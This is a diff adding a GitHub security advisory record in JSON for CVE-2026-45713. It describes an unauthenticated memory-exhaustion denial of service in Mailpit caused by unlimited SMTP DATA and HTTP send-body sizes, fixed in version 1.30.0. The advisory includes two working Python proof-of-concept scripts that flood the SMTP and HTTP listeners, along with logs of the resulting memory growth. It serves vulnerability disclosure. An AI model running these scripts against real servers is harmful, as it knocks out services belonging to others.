@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-fpxj-m5q8-fphw",
+  "modified": "2026-05-19T16:00:08.966208779Z",
+  "published": "2026-05-19T15:54:12Z",
+  "aliases": [
+    "CVE-2026-45713"
+  ],
+  "summary": "Mailpit: Unauthenticated remote memory-exhaustion DoS via unlimited SMTP DATA and /api/v1/send body sizes",
+  "details": "### Summary\nThe Mailpit SMTP server has a Server.MaxSize int field that controls the maximum allowed DATA payload size, but the field is never assigned anywhere outside test code, leaving it at Go's zero value (0 ⇒ \"no limit\"). The same applies to the HTTP /api/v1/send endpoint, whose request body is decoded with json.NewDecoder(r.Body) and no http.MaxBytesReader. Because Mailpit's default listeners bind [::]:1025 (SMTP) and [::]:8025 (HTTP), with no authentication required on either, a single network-reachable attacker can push an arbitrarily large message into Mailpit and watch RAM consumption spike with a ~7-10× amplification factor (raw frame → enmime envelope tree → search-text index → zstd-encoded write to SQLite). Repeating the attack — or running it concurrently from multiple connections — drives the process to OOM-kill.\n\n### Details\nPre-auth, remote DoS on every Mailpit deployment running the default configuration. Memory is the primary axis; disk is a secondary one, because each oversized message is also persisted to the SQLite store (config.MaxMessages caps the count at 500 but never the bytes — so 500 attacker-sized messages × 1 GiB each = ~500 GiB on the host disk before the LRU rotates).\n\n\nAffected code\n[internal/smtpd/smtpd.go:107](https://github.com/axllent/mailpit/blob/develop/internal/smtpd/smtpd.go#L107) — the field exists:\n\n```\ntype Server struct {\n    ...\n    MaxSize int // Maximum message size allowed, in bytes\n    ...\n}\n```\n[internal/smtpd/smtpd.go:863-877](https://github.com/axllent/mailpit/blob/develop/internal/smtpd/smtpd.go#L863-L877) — the enforcement is gated on \u003e 0:\n\n```\nfor {\n    ...\n    line, err := s.br.ReadBytes('\\n')\n    if err != nil {\n        return nil, err\n    }\n    if bytes.Equal(line, []byte(\".\\r\\n\")) {\n        break\n    }\n    if line[0] == '.' {\n        line = line[1:]\n    }\n\n    if s.srv.MaxSize \u003e 0 {                                   // ← only when set\n        if len(data)+len(line) \u003e s.srv.MaxSize {\n            _, _ = s.br.Discard(s.br.Buffered())\n            return nil, maxSizeExceeded(s.srv.MaxSize)\n        }\n    }\n    data = append(data, line...)                             // ← otherwise grows unbounded\n}\n```\n[internal/smtpd/main.go:223-248](https://github.com/axllent/mailpit/blob/develop/internal/smtpd/main.go#L223-L248) — the field is never populated; grep -rn \"MaxSize\" cmd/ config/ returns zero hits. There is no --smtp-max-message-size CLI flag, no MP_SMTP_MAX_MESSAGE_SIZE env var.\n\n[server/apiv1/send.go:45-52](https://github.com/axllent/mailpit/blob/develop/server/apiv1/send.go#L45-L52) — HTTP path has the same defect:\n\n```\ndecoder := json.NewDecoder(r.Body)\ndata := sendMessageParams{}\nif err := decoder.Decode(\u0026data.Body); err != nil {\n    httpJSONError(w, err.Error())\n    return\n}\n```\n\nNo r.Body = http.MaxBytesReader(w, r.Body, N) wrapper; server.ReadTimeout of 30 s is transmission-time, not body-size-budget.\n\n### PoC\nBaseline RSS on a freshly-started binary: 25 MiB. After one 100 MiB SMTP DATA block: ~1 037 MiB (≈10× amplification, single connection, no auth):\n\n```\n#!/usr/bin/env python3\n# poc-smtp-dos.py\nimport socket, sys\nhost, port = sys.argv[1], int(sys.argv[2])\nmb         = int(sys.argv[3])  # message size, MiB\n\ns = socket.create_connection((host, port), timeout=120)\ndef r(): return s.recv(4096).decode(\"latin-1\", \"replace\").strip()\nprint(r())\nfor cmd in [b\"HELO x\\r\\n\",\n            b\"MAIL FROM:\u003ca@b.com\u003e\\r\\n\",\n            b\"RCPT TO:\u003cc@d.com\u003e\\r\\n\",\n            b\"DATA\\r\\n\"]:\n    s.sendall(cmd); print(r())\ns.sendall(b\"Subject: oversize\\r\\n\\r\\n\")\nchunk = b\"X\" * (1024 * 1024)\nfor _ in range(mb): s.sendall(chunk)\ns.sendall(b\"\\r\\n.\\r\\n\")\nprint(r()); s.close()\n```\n\n```\n$ python3 poc-smtp-dos.py 127.0.0.1 1025 100\n220 hostname Mailpit ESMTP Service ready\n250 hostname greets x\n250 2.1.0 Ok\n250 2.1.5 Ok\n354 Start mail input; end with \u003cCR\u003e\u003cLF\u003e.\u003cCR\u003e\u003cLF\u003e\n250 2.0.0 Ok: queued as 58rI69JTJYjVFwogEbw9Jj\n\n$ ps -o rss= -p $(pgrep -f /usr/local/bin/mailpit)\n1062848    # ≈ 1 037 MiB, up from 25 MiB baseline\n```\n\nEquivalent over HTTP:\n\n```\n# poc-http-dos.py\nimport socket, sys\nhost, port, mb = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])\nprefix = b'{\"From\":{\"Email\":\"a@b.com\"},\"To\":[{\"Email\":\"c@d.com\"}],\"Subject\":\"big\",\"Text\":\"'\nsuffix = b'\"}'\nN      = mb * 1024 * 1024\nclen   = len(prefix) + N + len(suffix)\n\ns = socket.create_connection((host, port), timeout=120)\ns.sendall(\n    b\"POST /api/v1/send HTTP/1.1\\r\\n\"\n    b\"Host: x\\r\\n\"\n    b\"Content-Type: application/json\\r\\n\"\n    b\"Content-Length: \" + str(clen).encode() + b\"\\r\\n\"\n    b\"Connection: close\\r\\n\\r\\n\")\ns.sendall(prefix)\nchunk = b\"X\" * (1024 * 1024)\nfor _ in range(mb): s.sendall(chunk)\ns.sendall(suffix)\nprint(s.recv(500).decode(\"latin-1\", \"replace\"))\n```\n\n```\n$ python3 poc-http-dos.py 127.0.0.1 8025 200\nHTTP/1.1 200 OK\n...\n$ ps -o rss= -p $(pgrep -f /usr/local/bin/mailpit)\n2147000      # comfortably above 2 GiB on the same process\n\n```\n\nFive concurrent SMTP connections × 50 MiB each took the same machine from 25 MiB → 1 970 MiB during the attack window. With sufficient bandwidth the only ceiling is host RAM.\n\n### Impact\nUnauthenticated remote attackers can send arbitrarily large emails via SMTP or HTTP, causing unbounded memory and disk growth, leading to out-of-memory (OOM) kills and full Mailpit process crash (DoS)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/axllent/mailpit",
+        "purl": "pkg:golang/github.com/axllent/mailpit"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.30.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-fpxj-m5q8-fphw/GHSA-fpxj-m5q8-fphw.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/axllent/mailpit/security/advisories/GHSA-fpxj-m5q8-fphw"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/axllent/mailpit"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/axllent/mailpit/releases/tag/v1.30.0"
+    }
+  ]
+}
